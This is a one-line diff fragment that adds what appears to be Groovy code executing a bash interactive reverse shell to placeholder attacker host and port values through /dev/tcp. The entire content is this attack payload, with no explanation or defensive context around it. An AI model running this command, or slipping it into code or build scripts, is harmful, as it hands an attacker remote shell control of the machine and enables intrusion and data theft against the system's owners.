@@ -1,0 +1,1 @@
+['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/<port_num> 0>&1'].execute()
